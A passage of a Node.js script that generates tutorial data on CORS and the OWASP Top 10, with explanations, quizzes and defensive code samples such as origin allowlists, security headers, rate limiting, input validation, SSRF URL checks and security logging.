    q('What does Access-Control-Allow-Origin: * do?', 'Allows any origin to access the resource. Cannot be used with credentials (cookies).'),
    q('When do you need withCredentials?', 'When sending cookies or HTTP authentication in cross-origin requests. Server must set specific Allow-Origin.'),
    q('Does CORS protect the server?', 'No. CORS is enforced by the browser only. Server-to-server or curl requests bypass CORS.'),
    q('How do you handle CORS in development?', 'Use a proxy in dev server (webpack-dev-server, vite). Or configure CORS middleware with permissive dev settings.'),
    q('What is a common CORS misconfiguration?', 'Setting Access-Control-Allow-Origin to * when credentials are needed, or using a regex incorrectly on the Origin header.')
  ],
  R(10,35,110,25,'#0070f3','','Browser','myapp.com') +
  A(120,48,150,48) +
  R(160,35,110,25,'#dc3545','','API Server','api.example.com') +
  R(10,65,110,25,'#28a745','','Preflight','OPTIONS request') +
  R(10,95,110,25,'#ffc107','','CORS Headers','Allow-Origin, Methods, Headers') +
  R(10,125,110,25,'#e83e8c','','Credentials','Cookies allowed') +
  R(10,155,110,25,'#6610f2','','Specific Origin','Not wildcard for creds') +
  R(290,35,190,155,'#17a2b8','','CORS','Cross-Origin Resource Sharing: server tells browser which origins are allowed. SOP + CORS headers.') +
  T(240,220,'CORS: Browser security mechanism controlling cross-origin API access using HTTP headers.',9,'#666','middle'),
  [
    e('CORS Middleware (Express — cors package)', 'Standard CORS configuration.', codeBlock([
      'const cors = require(\'cors\');',
      '',
      '// Development: allow all origins',
      "app.use(cors()); // Access-Control-Allow-Origin: *",
      '',
      '// Production: specific origins',
      "app.use(cors({",
      "  origin: ['https://myapp.com', 'https://admin.myapp.com'],",
      "  methods: ['GET', 'POST', 'PUT', 'DELETE'],",
      "  allowedHeaders: ['Content-Type', 'Authorization'],",
      "  credentials: true,",
      "  maxAge: 86400 // cache preflight for 24h",
      '}));',
      '',
      '// Per-route configuration:',
      "app.get('/api/public', cors(), (req, res) => {",
      '  // Public API — any origin allowed',
      '});',
      '',
      "app.post('/api/orders',",
      "  cors({ origin: 'https://myapp.com', credentials: true }),",
      '  (req, res) => {',
      '    // Authenticated — specific origin',
      '  }',
      ');'
    ]), 'CORS middleware configuration for dev (permissive) and prod (specific origins).'),
    e('Custom CORS Middleware (Express)', 'Manual CORS header handling.', codeBlock([
      "const allowedOrigins = [",
      "  'https://myapp.com',",
      "  'https://admin.myapp.com'",
      '];',
      '',
      "app.use((req, res, next) => {",
      '  const origin = req.headers.origin;',
      '',
      '  // Allow specific origins',
      '  if (allowedOrigins.includes(origin)) {',
      "    res.setHeader('Access-Control-Allow-Origin', origin);",
      "    res.setHeader('Access-Control-Allow-Credentials', 'true');",
      '  }',
      '',
      "  res.setHeader('Access-Control-Allow-Methods',",
      "    'GET, POST, PUT, DELETE, OPTIONS'",
      '  );',
      "  res.setHeader('Access-Control-Allow-Headers',",
      "    'Content-Type, Authorization'",
      '  );',
      "  res.setHeader('Access-Control-Max-Age', '86400');",
      '',
      '  // Handle preflight',
      '  if (req.method === \'OPTIONS\') {',
      '    return res.status(204).end();',
      '  }',
      '',
      '  next();',
      '});'
    ]), 'Custom CORS middleware for fine-grained origin control with preflight handling.'),
    e('Dynamic Origin Validation', 'Validate against a whitelist.', codeBlock([
      "const cors = require('cors');",
      '',
      'const whitelist = [',
      "  'https://myapp.com',",
      "  /\.myapp\.com$/", // regex for subdomains
      '];',
      '',
      'const corsOptions = {',
      "  origin: (origin, callback) => {",
      '    // Allow requests with no origin (server-to-server)',
      '    if (!origin) return callback(null, true);',
      '',
      '    const allowed = whitelist.some(entry => {',
      '      if (entry instanceof RegExp) {',
      '        return entry.test(origin);',
      '      }',
      '      return entry === origin;',
      '    });',
      '',
      '    if (allowed) {',
      '      callback(null, true);',
      '    } else {',
      "      callback(new Error('Not allowed by CORS'));",
      '    }',
      '  },',
      "  credentials: true",
      '};',
      '',
      "app.use(cors(corsOptions));"
    ]), 'Dynamic CORS origin validation with support for regex patterns and subdomains.'),
    e('CORS with Credentials (Fetch + Express)', 'Send cookies cross-origin.', codeBlock([
      '// Client-side (fetch with credentials)',
      'fetch(\'https://api.example.com/orders\', {',
      "  credentials: 'include', // send cookies",
      '  headers: {',
      "    'Content-Type': 'application/json'",
      '  }',
      '});',
      '',
      '// Alternative: Axios',
      '// axios.get(\'https://api.example.com/orders\',',
      '//   { withCredentials: true }',
      '// );',
      '',
      '// Server-side (must have specific origin)',
      "app.use(cors({",
      "  origin: 'https://myapp.com', // NOT *",
      "  credentials: true // set cookie header",
      '}));',
      '',
      '// Without credentials: true, browser blocks',
      '// the response due to CORS policy'
    ]), 'Cross-origin requests with credentials require specific origin and credentials: true on both sides.'),
    e('Proxy CORS for Development', 'Avoid CORS in development.', codeBlock([
      '// vite.config.js — proxy API requests',
      'export default {',
      '  server: {',
      '    proxy: {',
      "      '/api': {",
      "        target: 'http://localhost:3000',",
      "        changeOrigin: true",
      '      }',
      '    }',
      '  }',
      '};',
      '',
      '// webpack-dev-server proxy',
      '// devServer: {',
      '//   proxy: {',
      "//     '/api': 'http://localhost:3000'",
      '//   }',
      '// }',
      '',
      '// Frontend calls /api/users (same origin)',
      '// Dev server proxies to http://localhost:3000/api/users',
      '// No CORS needed — same origin in browser'
    ]), 'Use a proxy in development to avoid CORS issues entirely — the browser sees same-origin requests.')
  ],
  [
    m('What does CORS stand for?', ['Cross-Origin Resource Sharing', 'Cross-Site Scripting', 'Cross-Origin Request Security', 'Content Security Policy'], 0, 'CORS = Cross-Origin Resource Sharing.'),
    m('What defines a web origin?', ['Protocol + Domain + Port', 'Domain only', 'URL path', 'IP address'], 0, 'Origin = protocol (https) + domain (example.com) + port (443).'),
    m('What is a preflight request?', ['The actual request', 'An OPTIONS check before the request', 'A redirect to the origin', 'A cookie validation'], 1, 'Preflight is an OPTIONS request to check server permissions before the actual request.'),
    m('What header specifies allowed origins?', ['Access-Control-Allow-Methods', 'Access-Control-Allow-Origin', 'Access-Control-Allow-Headers', 'Access-Control-Max-Age'], 1, 'Access-Control-Allow-Origin specifies which origins can access the resource.'),
    m('When must Access-Control-Allow-Origin be specific (not *)?', ['Always', 'When using credentials', 'For GET requests', 'For same-origin requests'], 1, 'Wildcard (*) cannot be used with credentials. A specific origin is required.'),
    m('Does CORS protect the server from malicious requests?', ['Yes', 'No, only the browser enforces CORS', 'Depends on configuration', 'Only for POST'], 1, 'CORS is browser-enforced only. Server-to-server or curl requests bypass it completely.')
  ]
);

/* =================== TOPIC 18: OWASP Top 10 =================== */
addTopic('auth-owasp', 'OWASP Top 10', 'advanced', 35,
  ['The OWASP Top 10 is a standard awareness document representing the most critical security risks to web applications, updated every 3-4 years.',
   'Current (2021): A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration.',
   'More: A06 Vulnerable and Outdated Components, A07 Identification and Authentication Failures, A08 Software and Data Integrity Failures, A09 Security Logging and Monitoring Failures, A10 SSRF.',
   'OWASP provides detailed prevention guidance, cheat sheets, and testing guides for each category.'
  ],
  'The OWASP Top 10 is like a "most wanted" poster for web vulnerabilities. It lists the top 10 ways websites get hacked, ranked by frequency and impact. Developers use it as a checklist: "Have we addressed all of these?" It gets updated periodically as new attack patterns emerge.',
  [
    d('A01: Broken Access Control (2021 #1)', 'Users can access resources they should not. Examples: IDOR (changing user_id in URL), privilege escalation (user becomes admin), directory traversal. Prevention: deny by default, validate permissions server-side, use RBAC/ABAC, implement rate limiting.'),
    d('A02: Cryptographic Failures', 'Weak or missing encryption of sensitive data. Examples: passwords stored in plaintext, weak hash algorithms (MD5/SHA-1), HTTP instead of HTTPS, weak TLS ciphers, predictable random numbers. Prevention: use strong encryption (AES-256, TLS 1.3), hash passwords (Argon2id/bcrypt), encrypt data at rest.'),
    d('A03: Injection', 'Untrusted data sent to an interpreter as part of a command. SQL, NoSQL, OS command, LDAP, and template injection. Prevention: parameterized queries, input validation, output encoding, use safe APIs, least privilege.'),
    d('A04: Insecure Design', 'Architectural flaws before code is written. Missing threat modeling, lack of rate limiting, insufficient security requirements. Prevention: secure design patterns, threat modeling, security reviews in design phase, limit resource consumption.'),
    d('A05: Security Misconfiguration', 'Default configurations, unnecessary features enabled, overly permissive CORS, error messages revealing stack traces, outdated software. Prevention: hardened configurations, disable debug in production, automated configuration scanning (CIS benchmarks), principle of least functionality.'),
    d('A06: Vulnerable and Outdated Components', 'Using libraries/frameworks with known vulnerabilities. Prevention: software composition analysis (SCA), dependency scanning (npm audit, Snyk), regular updates, remove unused dependencies, use only trusted sources.'),
    d('A07: Identification and Authentication Failures', 'Weak login mechanisms, credential stuffing, session fixation, weak passwords, missing MFA. Prevention: MFA, rate limiting, strong password policies, secure session management, credential monitoring (HaveIBeenPwned).'),
    d('A08: Software and Data Integrity Failures', 'CI/CD pipeline attacks, unsigned updates, compromised libraries (supply chain). Prevention: sign code and artifacts, verify software integrity (checksums), use software bill of materials (SBOM), secure CI/CD.'),
    d('A09: Security Logging and Monitoring Failures', 'Insufficient logging of security events, missing alerts, unmonitored logs. Prevention: log all auth events, failed logins, privilege changes, access denials. Implement centralized monitoring (SIEM). Set up alerts for suspicious patterns.'),
    d('A10: Server-Side Request Forgery (SSRF)', 'Attacker makes server send requests to internal resources. Examples: cloud metadata endpoints (169.254.169.254), internal services, localhost. Prevention: validate and sanitize URLs, block private IP ranges, use allowlists, network segmentation.')
  ],
  'The OWASP Top 10 provides a framework for thinking about web security systematically. Use it as a checklist during design and code review. The rankings change over time — access control is now #1. Address these at the design phase, not as an afterthought. Security is a continuous process, not a one-time fix.',
  [
    q('What is the OWASP Top 10?', 'A list of the 10 most critical web application security risks, updated every 3-4 years by the Open Web Application Security Project.'),
    q('What is the #1 risk in OWASP Top 10 (2021)?', 'Broken Access Control — users accessing resources they should not have permission to.'),
    q('What is A03: Injection?', 'Untrusted data being sent to an interpreter (SQL, NoSQL, OS command, etc.) as part of a command or query.'),
    q('What is A05: Security Misconfiguration?', 'Default or insecure configurations: unnecessary features, debug enabled, overly permissive CORS, cloud storage misconfigurations.'),
    q('What is A06: Vulnerable Components?', 'Using libraries or frameworks with known CVEs. Prevented by dependency scanning and regular updates.'),
    q('What is A07: Authentication Failures?', 'Weak login systems, credential stuffing, missing MFA, weak password policies, session management flaws.'),
    q('What is A10: SSRF?', 'Server-Side Request Forgery — attacker tricks the server into making requests to internal resources or cloud metadata endpoints.'),
    q('What is A08: Integrity Failures?', 'Supply chain attacks, unsigned software updates, compromised CI/CD pipelines.'),
    q('What is A09: Logging Failures?', 'Insufficient logging and monitoring of security events, making breach detection difficult.'),
    q('How often is the OWASP Top 10 updated?', 'Every 3-4 years. The latest was 2021. Next is expected 2024/2025.')
  ],
  R(10,35,105,18,'#0070f3','','A01 Access Ctrl','#1 risk') +
  R(115,35,105,18,'#28a745','','A02 Crypto','Weak encryption') +
  R(220,35,105,18,'#ffc107','','A03 Injection','SQL/NoSQL') +
  R(325,35,105,18,'#dc3545','','A04 Design','Architectural') +
  R(10,58,105,18,'#e83e8c','','A05 Misconfig','Defaults') +
  R(115,58,105,18,'#6610f2','','A06 Components','Old libraries') +
  R(220,58,105,18,'#17a2b8','','A07 Auth Fail','Login flaws') +
  R(325,58,105,18,'#0070f3','','A08 Integrity','Supply chain') +
  R(10,81,105,18,'#28a745','','A09 Logging','Monitoring') +
  R(115,81,105,18,'#ffc107','','A10 SSRF','Server request') +
  R(10,105,210,25,'#dc3545','','OWASP Top 10 2021','10 critical web security risks') +
  R(230,105,200,25,'#17a2b8','','Prevention','Design, code, deploy, monitor') +
  R(10,140,420,35,'#e83e8c','','OWASP Top 10','Awareness document for web security. Top risks: Access Control, Crypto, Injection, Design, Misconfig.') +
  T(240,205,'OWASP Top 10: The 10 most critical web application security risks. Updated every 3-4 years.',9,'#666','middle'),
  [
    e('OWASP Dependency Check (Node.js)', 'Scan for vulnerable components.', codeBlock([
      '# OWASP Dependency-Check (Java-based)',
      '# npm install -g dependency-check',
      '# dependency-check --project "My App" --scan ./',
      '',
      '# Or use npm audit',
      'npm audit',          // see vulnerabilities
      'npm audit fix',      // auto-fix (semver)
      'npm audit fix --force', // force update (breaking)',
      '',
      '# Or use Snyk (cloud-based)',
      '# npm install -g snyk',
      '# snyk auth',
      '# snyk test',
      '',
      '# Integrate in CI/CD',
      '# .github/workflows/security.yml',
      '# - run: npm audit --audit-level=high'
    ]), 'Dependency scanning tools for detecting known vulnerabilities in your dependencies.'),
    e('Security Headers (Helmet)', 'Set secure HTTP headers.', codeBlock([
      'const helmet = require(\'helmet\');',
      '',
      "app.use(helmet()); // sets all secure defaults",
      '',
      '// Equivalent to individual headers:',
      "// Content-Security-Policy: default-src 'self'",
      "// X-Content-Type-Options: nosniff",
      "// X-Frame-Options: SAMEORIGIN",
      "// Strict-Transport-Security: max-age=31536000",
      "// X-XSS-Protection: 0 (deprecated)",
      "// Referrer-Policy: no-referrer",
      "// Permissions-Policy: geolocation=()",
      '',
      '// Customize:',
      "app.use(helmet({",
      "  contentSecurityPolicy: {",
      "    directives: {",
      "      defaultSrc: [\"'self'\"],",
      "      scriptSrc: [\"'self'\", 'cdn.example.com']",
      '    }',
      '  }',
      '}));'
    ]), 'Helmet sets secure HTTP headers that mitigate many OWASP Top 10 risks (XSS, clickjacking, MIME sniffing).'),
    e('Rate Limiting (Brute Force Prevention)', 'Mitigate A07 auth failures.', codeBlock([
      'const rateLimit = require(\'express-rate-limit\');',
      '',
      '// Global rate limiter',
      'const limiter = rateLimit({',
      '  windowMs: 15 * 60 * 1000, // 15 minutes',
      '  max: 100,                  // 100 requests per window',
      '  standardHeaders: true,',
      '  legacyHeaders: false,',
      '});',
      "app.use('/api', limiter);",
      '',
      '// Auth-specific (stricter)',
      'const authLimiter = rateLimit({',
      '  windowMs: 15 * 60 * 1000,',
      '  max: 5, // 5 login attempts per window',
      '  message: {',
      "    error: 'Too many login attempts. Try again later.'",
      '  },',
      '  skipSuccessfulRequests: true, // count only failures',
      '});',
      "app.post('/login', authLimiter, loginHandler);"
    ]), 'Rate limiting prevents brute force attacks, credential stuffing, and DoS — addresses A07 and A04.'),
    e('Input Validation (Zod Schema)', 'Prevent injection (A03).', codeBlock([
      'const { z } = require(\'zod\');',
      '',
      'const loginSchema = z.object({',
      "  email: z.string().email(),",
      "  password: z.string().min(8).max(100)",
      '});',
      '',
      "app.post('/login', (req, res) => {",
      '  const result = loginSchema.safeParse(req.body);',
      '  if (!result.success) {',
      '    return res.status(400).json({',
      '      error: \'Validation failed\',',
      '      details: result.error.flatten()',
      '    });',
      '  }',
      '',
      '  const { email, password } = result.data;',
      '  // email and password are validated strings',
      '  // No injection possible via these inputs',
      '});',
      '',
      '// Also sanitize against NoSQL injection:',
      'const sanitize = require(\'mongo-sanitize\');',
      'const cleanBody = sanitize(req.body);'
    ]), 'Input validation with Zod prevents injection attacks by ensuring data conforms to expected types.'),
    e('SSRF Protection Middleware', 'Prevent Server-Side Request Forgery.', codeBlock([
      'const { URL } = require(\'url\');',
      '',
      '// Block private/reserved IP ranges',
      'const BLOCKED_IPS = [',
      "  '127.0.0.0/8', '10.0.0.0/8',",
      "  '172.16.0.0/12', '192.168.0.0/16',",
      "  '169.254.0.0/16', '0.0.0.0/8',",
      "  '::1', 'fc00::/7'",
      '];',
      '',
      'function validateRedirectUrl(url) {',
      '  try {',
      '    const parsed = new URL(url);',
      '',
      '    // Only allow HTTP/HTTPS',
      "    if (!['http:', 'https:'].includes(parsed.protocol)) {",
      '      return false;',
      '    }',
      '',
      '    // Block internal IPs',
      '    const hostname = parsed.hostname;',
      '    if (BLOCKED_IPS.some(range =>',
      '      ipRangeContains(range, hostname)',
      '    )) {',
      '      return false;',
      '    }',
      '',
      '    // Domain allowlist (recommended)',
      '    const allowed = [\'api.external.com\', \'data.example.com\'];',
      '    return allowed.includes(hostname);',
      '  } catch {',
      '    return false;',
      '  }',
      '}'
    ]), 'SSRF protection: validate and restrict URLs that the server can fetch — block internal IP ranges.'),
    e('Security Logging Middleware', 'Cover A09 logging failures.', codeBlock([
      '// Security event logger',
      'function logSecurityEvent(event, req, details) {',
      '  const log = {',
      '    timestamp: new Date().toISOString(),',
      '    event,',
      '    userId: req.user?.sub || req.session?.userId,',
      '    ip: req.ip,',
      '    userAgent: req.headers[\'user-agent\'],',
      '    path: req.path,',
      '    method: req.method,',
      '    details',
      '  };',
      '  ',
      '  // Send to centralized logging (Elastic, Datadog)',
      '  console.warn(\'SECURITY:\', JSON.stringify(log));',
      '}',
      '',
      '// Log auth events',
      "app.post('/login', (req, res, next) => {",
      '  // On success:',
      '  logSecurityEvent(\'LOGIN_SUCCESS\', req, { email });',
      '  // On failure:',
      '  logSecurityEvent(\'LOGIN_FAILED\', req, { email, reason });',
      '});',
      '',
      '// Log access denials',
      "app.use('/api/admin', (req, res, next) => {",
      '  if (!isAdmin(req)) {',
      '    logSecurityEvent(\'ACCESS_DENIED\', req, {',
      '      resource: req.path',
      '    });',
      '    return res.status(403).json({ error: \'Forbidden\' });',
      '  }',
      '  next();',
      '});'
    ]), 'Comprehensive security logging covers A09 — log auth events, access denials, and privilege changes.')
  ],
  [
    m('What is the #1 risk in OWASP Top 10 (2021)?', ['Injection', 'Broken Access Control', 'XSS', 'Cryptographic Failures'], 1, 'Broken Access Control moved to #1 in 2021, ahead of injection and cryptographic failures.'),
    m('What is A03: Injection?', ['Weak passwords', 'SQL/NoSQL/Command injection', 'Missing MFA', 'Outdated libraries'], 1, 'Injection covers SQL, NoSQL, OS command, LDAP, and template injection.'),
    m('What is A06 about?', ['Access control', 'Vulnerable and outdated components', 'Logging failures', 'SSRF'], 1, 'A06 covers using libraries/frameworks with known CVEs — prevented by dependency scanning.'),
    m('What is A10: SSRF?', ['SQL injection', 'Server-Side Request Forgery', 'Session management', 'Buffer overflow'], 1, 'SSRF tricks the server into making requests to internal resources or cloud metadata endpoints.'),
    m('What does A04: Insecure Design cover?', ['Code bugs', 'Architectural flaws before code', 'Network security', 'Physical security'], 1, 'A04 addresses design-level flaws: missing threat modeling, lack of rate limiting, insufficient security requirements.'),
    m('What is the best approach to OWASP Top 10?', ['Fix after deployment', 'Use as design checklist', 'Ignore unless breached', 'Only fix injection'], 1, 'Use OWASP Top 10 as a security checklist during design and code review — prevent, don\'t react.')
  ]
);

// ---- GENERATE ----
var dataDir = __dirname;

var lines = [];
lines.push('var TOPICS_DATA = TOPICS_DATA || {};');
lines.push('TOPICS_DATA["auth"] = TOPICS_DATA["auth"] || {};');
for (var id in topics) {
  lines.push('TOPICS_DATA["auth"]["' + id + '"] = ' + JSON.stringify(topics[id]) + ';');
}
fs.writeFileSync(dataDir + '/topics-data.js', lines.join('\n'));

fs.writeFileSync(dataDir + '/topics.json', JSON.stringify({ topics: topicList }, null, 2));

console.log('Generated Auth topics: ' + Object.keys(topics).length);
